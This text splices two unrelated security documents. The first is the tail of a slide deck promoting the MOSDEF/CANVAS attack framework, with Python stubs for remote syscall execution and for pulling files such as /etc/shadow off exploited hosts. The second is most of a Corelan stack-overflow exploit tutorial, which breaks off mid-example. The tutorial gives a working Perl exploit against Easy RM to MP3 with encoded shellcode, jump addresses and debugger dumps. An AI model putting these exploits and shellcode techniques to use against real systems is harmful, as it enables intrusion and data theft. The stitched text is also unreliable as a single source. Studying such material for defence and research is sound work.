to\nmodify an exploit's shellcode is a pain\n\u2013 Testing and debugging shellcode can\nwaste valuable hours that should be spent\ncoding SPIKE scripts\n\f_LSD-style Assembly\nComponents\n_ Only semi-flexible\n\u2013 Not well oriented torwards complex\ninteractions, such as calling\nCreateProcessAsUser(), fixing a heap, or\nother advanced techniques while staying\nin-process to maintain tokens\n\f_Little actual connectivity to\nback-end\n\u2013 Choice is to \u201cchoose a component\u201d rather\nthan implement any intelligence into your\nexploits\n_ i.e. I want to exploit a process, then if there is\nan administrative token in it, I want to offer\nthe user the chance to switch to that, and\nperhaps to switch to any other tokens in the\nprocess\n\f_Not Extensible\n_ Writing in assembly is a big pain \u2013 Each\ncomponent must be written by hand\n\u2013 Interacting with the components is done\nvia C \u2013 a poor language for large scale\nprojects\n\f_Shellcode Missions\n_ Shellcode can be thought of as two\nprocesses\nShellcode\nExploited Process Attacker\n\f_Shellcode Missions\n_ Step 1 is to establish back-connectivity\n_ Step 2 is to run a mission\nShellcode\nExploited Process Attacker\n\f_Establishing Back-\nConnectivity\n_ Step 1 is to establish back-connectivity\n\u2013 Connect-back\n\u2013 Steal Socket\n\u2013 Listen on a TCP\/UDP port\n\u2013 Don't establish any back-connectivity (if mission does\nnot require\/cannot get any)\nShellcode\nExploited Process\nAttacker\n\f_Running a Mission\n_ Step 2 is to run a mission\n\u2013 Recon\n\u2013 Trojan Install\n\u2013 Etc\nShellcode\nExploited Process Attacker\n\f_Running a Mission\n_ Missions are supported by various services from\nthe shellcode\n\u2013 Shell access\n\u2013 File transfer\n\u2013 Priviledge manipulation\nShellcode\nExploited Process Attacker\n\f_Mission Support\n_ Missions are poorly supported by traditional\nexecve() shellcode\n\u2013 Confuses \u201cpop a shell\u201d with the true mission\n\u2013 Moving the mission and the connectivity code\ninto the same shellcode makes for big unwieldy\nshellcode\nShellcode\nExploited Process\nAttacker\n\f_Mission Split\n_ Solution: split the mission from the stage1\nshellcode\n\u2013 Smaller, more flexible shellcode\nConnectivity\nShellcode\nExploited Process\nAttacker\n\f_Mission Split\n_ Solution: split the mission from the stage1\nshellcode\n\u2013 Smaller, more flexible shellcode\n\u2013 Simple paradigm: download more shellcode and\nexecute it\nConnectivity\nShellcode\nExploited Process\nAttacker\n\f_Stage 2\n_ Options:\n\u2013 Send traditional execve() shellcode\n_ Or similar 1-shot mission shellcode\n\u2013 Establish remote stack-swapping service\n(\u201csyscall redirection\u201d)\n\u2013 Establish remote MOSDEF service\nMission\nbelongs\nhere\nConnectivity\nShellcode\nExploited Process\nAttacker\n\f_Stack Swapping\n_ Aka \u201cSyscall redirection\u201d:\n\u2013 3 steps:\n_ Send a stack and a function pointer\/system call\nnumber\n_ Remote shellcode stub executes function\npointer\/system call using stack sent over\n_ Entire stack is sent back\nMission\nbelongs\nhere\nConnectivity\nShellcode\nExploited Process Attacker\n\f_Stack Swapping\n_ Benefits\n\u2013 Interactive with remote machine:\n_ Allows for interactive mission support on top of fairly\nsimple shellcode\nfd=self.open(\u201c\/tmp\/\nConnectivity\nShellcode\nExploited Process Attacker\nopen(\u201c\/tmp\/a\u201d)\neax=4\n\f_Stack Swapping - Benefits\n_ Most function arguments on Unix are easy to\nmarshall and demarshall\ndef unlink(self,path):\n\"\"\"\nDeletes a file - returns -1 on error\n\"\"\"\nself.setreg(\"call\",posixsyscalls[\"unlink\"])\nself.setreg(\"arg1\",self.ESP)\nrequest=\"\"\nrequest+=sunstring(path)\nself.sendrequest(request)\nresult=self.readresult()\nret=self.unorder(result[0:4])\nreturn ret\ndef setuid(self,uid):\nself.setreg(\"call\",posixsyscalls[\"setuid\"])\nself.setreg(\"arg1\",uid)\nrequest=\"\"\nself.sendrequest(request)\nresult=self.readresult()\nret=self.unorder(result[0:4])\nreturn ret\n\f_Stack Swapping - Benefits\n_ Most missions can be supported with\nrelatively few remotely executed functions\n\u2013 Execute a command\n\u2013 Transfer a File\n\u2013 Chdir()\n\u2013 Chroot()\n\u2013 popen()\n\f_Stack Swapping - Problems\n_ You cannot share a socket with stack\nswapping shellcode\n\u2013 Fork() becomes a real problem\n_ Solution: set a fake syscall number for \u201cexec the stack\nbuffer\u201d\n_ Have to write fork()+anything in assembly\n_ Not a nicely portable solution\n_ Makes our shellcode more complex\n_ Still cannot return a different error message for when\nthe fork() fails versus when the execve() fails\n\f_Stack Swapping - Problems\n_ You cannot share a socket with stack\nswapping shellcode\n\u2013 You are going to do one function call at a time\n_ China's pingtime is 1 second from my network\n_ Those who do not use TCP are doomed to repeat it\n\f_Stack Swapping - Problems\n_ Basic stack swapping download code for\nSolaris\ndef download(self,source,dest):\n\"\"\"\ndownloads a file from the remote server\n\"\"\"\ninfile=self.open(source,O_NOMODE)\nif infile==-1:\nreturn \"Couldn't open remote file %s, sorry.\"%source\nif os.path.isdir(dest):\ndest=os.path.join(dest,source)\noutfile=open(dest,\"wb\")\nif outfile==None:\nreturn \"Couldn't open local file %s\"%dest\nself.log( \"infile = %8.8x\"%infile)\ndata=\"A\"\nsize=0\nwhile data!=\"\":\ndata=self.read(infile)\nsize+=len(data)\noutfile.write(data)\nself.close(infile)\noutfile.close()\nreturn \"Read %d bytes of data into %s\"%(size dest)\n\f_Stack Swapping - Problems\n_ File download protocol from randomhost.cn\nwhile data!=\"\":\ndata=self.read(infil\nsize+=len(data)\noutfile.write(data)\nself.close(infile)\nStack\nSwapping\nShellcode\nExploited Process Attacker\nopen(\/etc\/shadow)\no1=4\nread(4,1000 bytes)\n%O1=1000\n1000 bytes\nread(4,1000 bytes)\n%O1=1000\n1000 bytes\nclose(4)\n%O1=0\n\f_Stack Swapping - Problems\n_ time=1second * (sizeof(file)\/1000)+2\nwhile data!=\"\":\ndata=self.read(infil\nsize+=len(data)\noutfile.write(data)\nself.close(infile)\nStack\nSwapping\nShellcode\nExploited Process Attacker\nopen(\/etc\/shadow)\no1=4\nread(4,1000 bytes)\n%O1=1000\n1000 bytes\nread(4,1000 bytes)\n%O1=1000\n1000 bytes\nclose(4)\n%O1=0\n\f_Stack Swapping - Problems\n_ All iterative operations take 1second * n in\nChina\n\u2013 Finding valid thread tokens\n\u2013 Downloading and uploading files\n\u2013 Executing commands with large output\n\u2013 Things I haven't thought of but may want to do in\nthe future\n_ \u201cBut usually you have a fast network!\u201d\n_ \u201cYou can always hand-code these things as\na special case to make it faster!\u201d\n\f_Stack Swapping - Problems\n_ Although stack swapping does give us needed\ndynamic mission support:\n\u2013 Inefficient network protocol\n\u2013 Inability to do more than one thing at a time\n\u2013 Complex functions require painful hand\nmarshalling and demarshalling \u2013 or the creation\nof IDL files and an automatic IDL marshaller,\nwhich is just as bad\n\u2013 Common requirements, such as fexec() and\nGetLastError() require special casing \u2013 a bad\nsign\n\u2013 Cannot port from one architecture to the other\nnicely\n\f_MOSDEF design requirments\n_ Efficient network protocol\n_ The ability to do more than one thing at a\ntime\n\u2013 I want cross-platform job control in my shellcode!\n_ No hand marshalling\/demarshalling\n_ No need to special case fork() or\nGetLastError()\n_ Port from one architecture to the other nicely\n\f_MOSDEF sample\n_ Compare and Contrast\ncreat(self,filename):\n\"\"\"\ninputs: the filename to open\noutpts: returns -1 on failure, otherwise a file handle\ntruncates the file if possible and it exists\n\"\"\"\naddr=self.getprocaddress(\"kernel32.dll\",\"_lcreat\")\nif addr==0:\nprint \"Failed to find lcreat function!\"\nreturn -1\n#ok, now we know the address of lcreat\nrequest=intel_order(addr)\nrequest+=intel_order(self.ESP+0xc)\nrequest+=intel_order(0)\nrequest+=filename+chr(0)\nself.sendrequest(request)\nresult=self.readresult()\nfd=istr2int(result[:4])\nreturn fd\ndef lcreat(self,filename):\n\"\"\"\ninputs: the filename to open\noutputs: returns -1 on failure, otherwise a file handle\ntruncates the file if possible and it exists\n\"\"\"\nrequest=self.compile(\"\"\"\n#import \"remote\",\"Kernel32._lcreat\" as \"_lcreat\"\n#import \"local\",\"sendint\" as \"sendint\"\n#import \"string\",\"filename\" as \"filename\"\n\/\/start of code\nvoid main()\n{\nint i;\ni=_lcreat(filename);\nsendint(i);\n}\n\"\"\")\nself.sendrequest(request)\nfd=self.readint()\nreturn fd\n\f_MOSDEF sample\n_ What does this take?\nef lcreat(self,filename):\n\"\"\"\ninputs: the filename to open\noutputs: returns -1 on failure, otherwise a file handle\ntruncates the file if possible and it exists\n\"\"\"\nrequest=self.compile(\"\"\"\n#import \"remote\",\"Kernel32._lcreat\" as \"_lcreat\"\n#import \"local\",\"sendint\" as \"sendint\"\n#import \"string\",\"filename\" as \"filename\"\n\/\/start of code\nvoid main()\n{\nint i;\ni=_lcreat(filename);\nsendint(i);\n}\n\"\"\")\nself.sendrequest(request)\nfd=self.readint()\n_A C compiler\n_An x86 assembler\n_A remote linker\n\f_MOSDEF portability\n_ Internal architecture\nRemote\nLinker\nCompiler\nC Code\nAssembler\nShellcode\nCache\nTarget\nIL->ASM\nAT&T\nx86\n\f_MOSDEF network efficiencies\n_ While loops are moved to remote side and\nexecuted inside hacked process\n_ Only the information that is needed is sent\nback \u2013 write() only sends 4 bytes back\n_ Multiple paths can be executed\n\u2013 on error, you can send back an error message\n\u2013 On success you can send back a data structure\n\f_MOSDEF marshalling\n_ [Un]Marshalling is done in C\n\u2013 Easy to read, understand, modify\n\u2013 Easy to port\n_ integers don't need re-endianing\n_ Types can be re-used\n\f_Cross-platform job control\n_ The main problem is how to share the\noutbound TCP socket\n\u2013 What we really need is cross-platform locking\n_ Unix (processes) flock()\n_ Windows (threads) EnterCriticalSection()\n\u2013 Now we can spin off a \u201cprocess\u201d, and have it\nreport back!\n_ The only things that change are sendint(),\nsendstring() and sendbuffer()\n_ These change globally \u2013 our code does not need to\nbe \u201cthread aware\u201d\n\f_Other benefits\n_ No special cases\n_ Having an assembler in pure python gives\nyou the ability to finally get rid of giant blocks\nof \u201c\\xeb\\x15\\x44\\x55\\x11\u201d in your exploits.\nYou can just self.assemble() whatever you\nneed\n_ Future work around finding smaller\nshellcode, writing shellcode without bad\ncharacters, polymorphic shellcode\n\fConclusion\n_ MOSDEF is a new way to\nbuild attack infrastructures,\navoiding many of the\nproblems of earlier\ninfrastructures\n_ Prevent hacker starvation \u2013\nbuy CANVAS for $995 today\n_ More information on this and\nother fun things at\nhttp:\/\/www.immunitysec.com\/\n\f"}
{"text":"#[1]Corelan Cybersecurity Research \u00bb Feed [2]Corelan Cybersecurity\nResearch \u00bb Comments Feed [3]Corelan Cybersecurity Research \u00bb Exploit\nwriting tutorial part 2 : Stack Based Overflows \u2013 jumping to shellcode\nComments Feed [4]alternate [5]alternate [6]alternate\n[7]Corelan Cybersecurity Research\n:: Knowledge is not an object, it's a flow ::\n* [8]Home\n*\n* [9]Articles\n*\n* [10]Free Tools\n+ [11]AD & CS\no [12]AD Disable Users\no [13]Certificate List Utility\no [14]PVE Find AD User\n+ [15]Exchange Transport Agents\no [16]Attachment filter\no [17]Attachment rename\n+ [18]Networking\no [19]Cisco switch backup utility\no [20]Network monitoring with powershell\no [21]TCP Ping\n+ [22]Security Related Tools\n*\n* [23]Security\n+ [24]Corelan Team Members\no [25]Corelan Team Membership\n+ [26]Corelan Training \"Corelan Live\u2026\n+ [27]Exploit writing tutorials\n+ [28]Metasploit\no [29]FTP Client fuzzer\no [30]HTTP Form field fuzzer\no [31]Simple FTP Fuzzer \u2013 Metasploit\u2026\n+ [32]Nessus\/Openvas ike-scan wrapper\n+ [33]Vulnerability Disclosure Policy\n+ [34]mona.py PyCommand for Immunity Debugger\no [35]Download mona.py\no [36]Mona.py \u2013 documentation\n+ [37]Corelan ROPdb\n+ [38]Mirror for BoB\u2019s Immunity Debugger\u2026\n*\n* [39]Terms of use\n*\n* [40]Donate\n*\n* [41]About\u2026\n+ [42]About Corelan Team\n+ [43]About me\n+ [44]Antivirus\/antimalware\n+ [45]Corelan public keys\n+ [46]Sitemap\n\u00ab [47]Exploit writing tutorial part 1 : Stack Based Overflows\n[48]Exploit writing tutorial part 3 : SEH Based Exploits \u00bb\nPlease consider donating: [49]https:\/\/www.corelan.be\/index.php\/donate\/\n220,130 views\nExploit writing tutorial part 2 : Stack Based Overflows \u2013 jumping to\nshellcode\nPublished July 23, 2009 | By [50]Peter Van Eeckhoutte (corelanc0d3r)\nWhere do you want to jmp today ?\nIn [51]one of my previous posts (part 1 of writing stack based buffer\noverflow exploits), I have explained the basisc about discovering a\nvulnerability and using that information to build a working exploit. In\nthe example I have used in that post, we have seen that ESP pointed\nalmost directly at the begin of our buffer (we only had to prepend 4\nbytes to the shellcode to make ESP point directly at the shellcode),\nand we could use a \u201cjmp esp\u201d statement to get the shellcode to run.\nNote : This tutorial heavily builds on part 1 of the tutorial series,\nso please take the time to fully read and understand part 1 before\nreading part 2.\nThe fact that we could use \u201cjmp esp\u201d was an almost perfect scenario.\nIt\u2019s not that \u2018easy\u2019 every time. Today I\u2019ll talk about some other ways\nto execute\/jump to shellcode, and finally about what your options are\nif you are faced with small buffer sizes.\nThere are multiple methods of forcing the execution of shellcode.\n* jump (or call) a register that points to the shellcode. With this\ntechnique, you basically use a register that contains the address\nwhere the shellcode resides and put that address in EIP. You try to\nfind the opcode of a \u201cjump\u201d or \u201ccall\u201d to that register in one of\nthe dll\u2019s that is loaded when the application runs. When crafting\nyour payload, instead of overwriting EIP with an address in memory,\nyou need to overwrite EIP with the address of the \u201cjump to the\nregister\u201d.  Of course, this only works if one of the available\nregisters contains an address that points to the shellcode. This is\nhow we managed to get our exploit to work in part 1, so I\u2019m not\ngoing to discuss this technique in this post anymore.\n* pop return : If none of the registers point directly to the\nshellcode, but you can see an address on the stack (first, second,\n\u2026 address on the stack) that points to the shellcode, then you can\nload that value into EIP by first putting a pointer to pop ret, or\npop pop ret, or pop pop pop ret (all depending on the location of\nwhere the address is found on the stack) into EIP.\n* push return : this method is only slightly different than the \u201ccall\nregister\u201d technique.  If you cannot find a or opcode anywhere, you\ncould simply put the address on the stack and then do a ret.  So\nyou basically try to find a push , followed by a ret.  Find the\nopcode for this sequence, find an address that performs this\nsequence, and overwrite EIP with this address.\n* jmp [reg + offset] : If there is a  register that points to the\nbuffer containing the shellcode, but it does not point at the\nbeginning of the shellcode, you can also try to find an instruction\nin one of the OS or application dll\u2019s, which will add the required\nbytes to the register and then jumps to the register. I\u2019ll refer to\nthis method as jmp [reg]+[offset]\n* blind return : in my previous post I have explained that ESP points\nto the current stack position (by definition).  A RET instruction\nwill \u2018pop\u2019 the last value (4bytes) from the stack and will put that\naddress in ESP. So if you overwrite EIP with the address that will\nperform a RET instruction, you will load the value stored at ESP\ninto EIP.\n* If you are faced with the fact that the available space in the\nbuffer (after the EIP overwrite) is limited, but you have plenty of\nspace before overwriting EIP, then you could use jump code in the\nsmaller buffer to jump to the main shellcode in the first part of\nthe buffer.\n* SEH : Every application has a default exception handler which is\nprovided for by the OS. So even if the application itself does not\nuse exception handling, you can try to overwrite the SEH handler\nwith your own address and make it jump to your shellcode. Using SEH\ncan make an exploit more reliable on various windows platforms, but\nit requires some more explanation before you can start abusing the\nSEH to write exploits.  The idea behind this is that if you build\nan exploit that does not work on a given OS, then the payload might\njust crash the application (and trigger an exception). So if you\ncan combine a \u201cregular\u201d exploit with a seh based exploit, then you\nhave build a more reliable exploit. Anyways, the next part of the\nexploit writing tutorial series (part 3) will deal with SEH.   Just\nremember that a typical stack based overflow, where you overwrite\nEIP, could potentionally be subject to a SEH based exploit\ntechnique as well, giving you more stability, a larger buffer size\n(and overwriting EIP would trigger SEH\u2026 so it\u2019s a win win)\nThe techniques explained in this document are just examples.  The goal\nof this post is to explain to you that there may be various ways to\njump to your shellcode, and in other cases there may be only one (and\nmay require a combination of techniques) to get your arbitrary code to\nrun.\nThere may be many more methods to get an exploit to work and to work\nreliably, but if you master the ones listed here, and if you use your\ncommon sense, you can find a way around most issues when trying to make\nan exploit jump to your shellcode. Even if a technique seems to be\nworking, but the shellcode doesn\u2019t want to run, you can still play with\nshellcode encoders, move shellcode a little bit further and put some\nNOP\u2019s before the shellcode\u2026 these are all things that may help making\nyour exploit work.\nOf course, it is perfectly possible that a vulnerability only leads to\na crash, and can never be exploited.\nLet\u2019s have a look at the practical implementation of some of the\ntechniques listed above.\ncall [reg]\nIf a register is loaded with an address that directly points at the\nshellcode, then you can do a call [reg] to jump directly to the\nshellcode. In other words, if ESP directly points at the shellcode (so\nthe first byte of ESP is the first byte of your shellcode), then you\ncan overwrite EIP with the address of \u201ccall esp\u201d, and the shellcode\nwill be executed.  This works with all registers and is quite popular\nbecause kernel32.dll contains a lot of call [reg] addresses.\nQuick example : assuming that ESP points to the shellcode : First, look\nfor an address that contains the \u2018call esp\u2019 opcode. We\u2019ll use findjmp :\nfindjmp.exe kernel32.dll esp\nFindjmp, Eeye, I2S-LaB\nFindjmp2, Hat-Squad\nScanning kernel32.dll for code useable with the esp register\n0x7C836A08      call esp\n0x7C874413      jmp esp\nFinished Scanning kernel32.dll for code useable with the esp register\nFound 2 usable addresses\nNext, write the exploit and overwrite EIP with 0x7C836A08.\nFrom the Easy RM to MP3 example in the first part of this tutorial\nseries, we know that we can point ESP at the beginning of our shellcode\nby adding 4 characters between the place where EIP is overwritten and\nESP.  A typical exploit would then look like this :\nmy $file= \"test1.m3u\";\nmy $junk= \"A\" x 26094;\nmy $eip = pack('V',0x7C836A08); #overwrite EIP with call esp\nmy $prependesp = \"XXXX\";  #add 4 bytes so ESP points at beginning of shellcode b\nytes\nmy $shellcode = \"\\x90\" x 25;   #start shellcode with some NOPS\n# windows\/exec - 303 bytes\n# http:\/\/www.metasploit.com\n# Encoder: x86\/alpha_upper\n# EXITFUNC=seh, CMD=calc\n$shellcode = $shellcode . \"\\x89\\xe2\\xda\\xc1\\xd9\\x72\\xf4\\x58\\x50\\x59\\x49\\x49\\x49\\\nx49\" .\n\"\\x43\\x43\\x43\\x43\\x43\\x43\\x51\\x5a\\x56\\x54\\x58\\x33\\x30\\x56\" .\n\"\\x58\\x34\\x41\\x50\\x30\\x41\\x33\\x48\\x48\\x30\\x41\\x30\\x30\\x41\" .\n\"\\x42\\x41\\x41\\x42\\x54\\x41\\x41\\x51\\x32\\x41\\x42\\x32\\x42\\x42\" .\n\"\\x30\\x42\\x42\\x58\\x50\\x38\\x41\\x43\\x4a\\x4a\\x49\\x4b\\x4c\\x4a\" .\n\"\\x48\\x50\\x44\\x43\\x30\\x43\\x30\\x45\\x50\\x4c\\x4b\\x47\\x35\\x47\" .\n\"\\x4c\\x4c\\x4b\\x43\\x4c\\x43\\x35\\x43\\x48\\x45\\x51\\x4a\\x4f\\x4c\" .\n\"\\x4b\\x50\\x4f\\x42\\x38\\x4c\\x4b\\x51\\x4f\\x47\\x50\\x43\\x31\\x4a\" .\n\"\\x4b\\x51\\x59\\x4c\\x4b\\x46\\x54\\x4c\\x4b\\x43\\x31\\x4a\\x4e\\x50\" .\n\"\\x31\\x49\\x50\\x4c\\x59\\x4e\\x4c\\x4c\\x44\\x49\\x50\\x43\\x44\\x43\" .\n\"\\x37\\x49\\x51\\x49\\x5a\\x44\\x4d\\x43\\x31\\x49\\x52\\x4a\\x4b\\x4a\" .\n\"\\x54\\x47\\x4b\\x51\\x44\\x46\\x44\\x43\\x34\\x42\\x55\\x4b\\x55\\x4c\" .\n\"\\x4b\\x51\\x4f\\x51\\x34\\x45\\x51\\x4a\\x4b\\x42\\x46\\x4c\\x4b\\x44\" .\n\"\\x4c\\x50\\x4b\\x4c\\x4b\\x51\\x4f\\x45\\x4c\\x45\\x51\\x4a\\x4b\\x4c\" .\n\"\\x4b\\x45\\x4c\\x4c\\x4b\\x45\\x51\\x4a\\x4b\\x4d\\x59\\x51\\x4c\\x47\" .\n\"\\x54\\x43\\x34\\x48\\x43\\x51\\x4f\\x46\\x51\\x4b\\x46\\x43\\x50\\x50\" .\n\"\\x56\\x45\\x34\\x4c\\x4b\\x47\\x36\\x50\\x30\\x4c\\x4b\\x51\\x50\\x44\" .\n\"\\x4c\\x4c\\x4b\\x44\\x30\\x45\\x4c\\x4e\\x4d\\x4c\\x4b\\x45\\x38\\x43\" .\n\"\\x38\\x4b\\x39\\x4a\\x58\\x4c\\x43\\x49\\x50\\x42\\x4a\\x50\\x50\\x42\" .\n\"\\x48\\x4c\\x30\\x4d\\x5a\\x43\\x34\\x51\\x4f\\x45\\x38\\x4a\\x38\\x4b\" .\n\"\\x4e\\x4d\\x5a\\x44\\x4e\\x46\\x37\\x4b\\x4f\\x4d\\x37\\x42\\x43\\x45\" .\n\"\\x31\\x42\\x4c\\x42\\x43\\x45\\x50\\x41\\x41\";\nopen($FILE,\">$file\");\nprint $FILE $junk.$eip.$prependesp.$shellcode;\nclose($FILE);\nprint \"m3u File Created successfully\\n\";\n[52]image\npwned !\npop ret\nAs explained above, In the Easy RM to MP3 example, we have been able to\ntweak our buffer so ESP pointed directly at our shellcode. What if\nthere is not a single register that points to the shellcode ?\nWell, in this case, an address pointing to the shellcode may be on the\nstack.  If you dump esp, look at the first addresses. If one of these\naddresses points to your shellcode (or a buffer you control), then you\ncan find a pop ret or pop pop ret (nothing to do with SEH based\nexploits here) to\n\u2013 take addresses from the stack (and skip them)\n\u2013 jump to the address which should bring you to the shellcode.\nThe pop ret technique obviously is only usabled when ESP+offset already\ncontains an address which points to the shellcode\u2026   So dump esp, see\nif one of the first addresses points to the shellcode, and put a\nreference to pop ret (or pop pop ret or pop pop pop ret) into EIP.\nThis will take some address from the stack (one address for each pop)\nand will then put the next address into EIP. If that one points to the\nshellcode, then you win.\nThere is a second use for pop ret : what if you control EIP, no\nregister points to the shellcode, but your shellcode can be found at\nESP+8.   In that case, you can put a pop pop ret into EIP, which will\njump to ESP+8. If you put a pointer to jmp esp at that location, then\nit will jump to the shellcode that sits right after the jmp esp\npointer.\nLet\u2019s build a test case. We know that we need 26094 bytes before\noverwriting EIP, and that we need 4 more bytes before we are at the\nstack address where ESP points at (in my case, this is 0x000ff730).\nWe will simulate that at ESP+8, we have an address that points to the\nshellcode. (in fact, we\u2019ll just put the shellcode behind it \u2013 again,\nthis is just a test case).\n26094 A\u2019s, 4 XXXX\u2019s (to end up where ESP points at), then a break, 7\nNOP\u2019s, a break, and more NOP\u2019s.  Let\u2019s pretend the shellcode begins at\nthe second break.  The goal is to make a jump over the first break,\nright to the second break (which is at ESP+8 bytes = 0x000ff738).\nmy $file= \"test1.m3u\";\nmy $junk= \"A\" x 26094;\nmy $eip = \"BBBB\"; #overwrite EIP\nmy $prependesp = \"XXXX\";  #add 4 bytes so ESP points at beginning of shellcode b\nytes\nmy $shellcode = \"\\xcc\"; #first break\n$shellcode = $shellcode . \"\\x90\" x 7;  #add 7 more bytes\n$shellcode = $shellcode . \"\\xcc\"; #second break\n$shellcode = $shellcode . \"\\x90\" x 500;  #real shellcode\nopen($FILE,\">$file\");\nprint $FILE $junk.$eip.$prependesp.$shellcode;\nclose($FILE);\nprint \"m3u File Created successfully\\n\";\nLet\u2019s look at the stack :\nApplication crashed because of the buffer overflow. We\u2019ve overwritten\nEIP with \u201cBBBB\u201d.  ESP points at 000ff730 (which starts with the first\nbreak), then 7 NOP\u2019s, and then we see the second break, which really is\nthe begin of our shellcode (and sits at address 0x000ff738).\neax=00000001 ebx=00104a58 ecx=7c91005d edx=00000040 esi=77c5fce0 edi=000067fa\neip=42424242 esp=000ff730 ebp=00344200 iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206\nMissing image name, possible paged-out or corrupt data.\nMissing image name, possible paged-out or corrupt data.\nMissing image name, possible paged-out or corrupt data.\n+0x42424231:\n42424242 ??              ???\n0:000> d esp\n000ff730  cc 90 90 90 90 90 90 90-cc 90 90 90 90 90 90 90  ................\n000ff740  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff750  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff760  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff770  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff780  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff790  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff7a0  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n0:000> d 000ff738\n000ff738  cc 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff748  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff758  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff768  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff778  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff788  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff798  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff7a8  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\nThe goal is to get the value of ESP+8 into EIP (and to craft this value\nso it jumps to the shellcode).  We\u2019ll use the pop ret technique +\naddress of jmp esp to accomplish this.\nOne POP instruction will take 4 bytes off the top of the stack.  So the\nstack pointer would then point at 000ff734.  Running another pop\ninstruction would take 4 more bytes off the top of the stack. ESP would\nthen point to 000ff738. When we a \u201cret\u201d instruction is performed, the\nvalue at the current address of ESP is put in EIP.  So if the value at\n000ff738 contains the address of a jmp esp instruction, then that is\nwhat EIP would do.  The buffer after 000ff738 must then contains our\nshellcode.\nWe need to find the pop,pop,ret instruction sequence somewhere, and\noverwrite EIP with the address of the first part of the instruction\nsequence, and we must set ESP+8 to the address of jmp esp, followed by\nthe shellcode itself.\nFirst of all, we need to know the opcode for pop pop ret. We\u2019ll use the\nassemble functionality in windbg to get the opcodes :\n0:000> a\n7c90120e pop eax\npop eax\n7c90120f pop ebp\npop ebp\n7c901210 ret\nret\n7c901211\n0:000> u 7c90120e\nntdll!DbgBreakPoint:\n7c90120e 58              pop     eax\n7c90120f 5d              pop     ebp\n7c901210 c3              ret\n7c901211 ffcc            dec     esp\n7c901213 c3              ret\n7c901214 8bff            mov     edi,edi\n7c901216 8b442404        mov     eax,dword ptr [esp+4]\n7c90121a cc              int     3\nso the pop pop ret opcode is 0x58,0x5d,0xc3\nOf course, you can pop to other registers as well. These are some other\navailable pop opcodes :\npop register opcode\npop eax      58\npop ebx      5b\npop ecx      59\npop edx      5a\npop esi      5e\npop ebp      5d\nNow we need to find this sequence in one of the available dll\u2019s. In\npart 1 of the tutorial we have spoken about application dll\u2019s versus OS\ndll\u2019s. I guess it\u2019s recommended to use application dll\u2019s because that\nwould increase the chances on building a reliable exploit across\nwindows platforms\/versions\u2026 But you still need to make sure the dll\u2019s\nuse the same base addresses every time. Sometimes, the dll\u2019s get\nrebased and in that scenario it could be better to use one of the os\ndll\u2019s (user32.dll or kernel32.dll for example)\nOpen Easy RM to MP3 (don\u2019t open a file or anything) and then attach\nwindbg to the running process.\nWindbg will show the loaded modules, both OS modules and application\nmodules. (Look at the top of the windbg output, and find the lines that\nstart with ModLoad).\nThese are a couple of application dll\u2019s\nModLoad: 00ce0000 00d7f000   C:\\Program Files\\Easy RM to MP3 Converter\\MSRMfilte\nr01.dll\nModLoad: 01a90000 01b01000   C:\\Program Files\\Easy RM to MP3 Converter\\MSRMCcode\nc00.dll\nModLoad: 00c80000 00c87000   C:\\Program Files\\Easy RM to MP3 Converter\\MSRMCcode\nc01.dll\nModLoad: 01b10000 01fdd000   C:\\Program Files\\Easy RM to MP3 Converter\\MSRMCcode\nc02.dll\nyou can show the image base of a dll by running dumpbin.exe (from\nVisual Studio) with parameter \/headers against the dll. This will\nallow you to define the lower and upper address for searches.\nYou should try to avoid using addresses that contain null bytes\n(because it would make the exploit harder\u2026 not impossible, just\nharder.)\nA search in MSRMCcodec00.dll gives us some results :\n0:014> s 01a90000 l 01b01000 58 5d c3\n01ab6a10  58 5d c3 33 c0 5d c3 55-8b ec 51 51 dd 45 08 dc  X].3.].U..QQ.E..\n01ab8da3  58 5d c3 8d 4d 08 83 65-08 00 51 6a 00 ff 35 6c  X]..M..e..Qj..5l\n01ab9d69  58 5d c3 6a 02 eb f9 6a-04 eb f5 b8 00 02 00 00  X].j...j........\nOk, we can jump to ESP+8 now.  In that location we need to put the\naddress to jmp esp (because, as explained before, the ret instruction\nwill take the address from that location and put it in EIP. At that\npoint, the ESP address will point to our shellcode which is located\nright after the jmp esp address\u2026 so what we really want at that point\nis a jmp esp)\nFrom part 1 of the tutorial, we have learned that 0x01ccf23a refers to\njmp esp.\nOk, let\u2019s go back to our perl script and replace the \u201cBBBB\u201d (used to\noverwrite EIP with) with one of the 3 pop,pop,ret addresses, followed\nby 8 bytes (NOP) (to simulate that the shellcode is 8 bytes off from\nthe top of the stack), then the jmp esp address, and then the\nshellcode.\nThe buffer will look like this :\n[AAAAAAAAAAA...AA][0x01ab6a10][NOPNOPNOPNOPNOPNOPNOPNOP][0x01ccf23a][Shellcode]\n26094 A's         EIP           8 bytes offset          JMP ESP\n(=POPPOPRET)\nThe entire exploit flow will look like this :\n1 : EIP is overwritten with POP POP RET (again, this example has\nnothing to do with SEH based exploits. We just want to get a value that\nis on the stack into EIP). ESP points to begin of 8byte offset from\nshellcode\n2 : POP POP RET is executed. EIP gets overwritten with 0x01ccf23a\n(because that is the address that was found at ESP+0x8). ESP now points\nto shellcode.\n3 : Since EIP is overwritten with address to jmp esp, the second jump\nis executed and the shellcode is launched.\n----------------------------------\n|                                 |(1)\n|                                 |\n|       ESP points here (1)       |\n|       |                         V\n[AAAAAAAAAAA...AA][0x01ab6a10][NOPNOPNOPNOPNOPNOPNOPNOP][0x01ccf23a][Shellcode]\n26094 A's         EIP           8 bytes offset          JMP 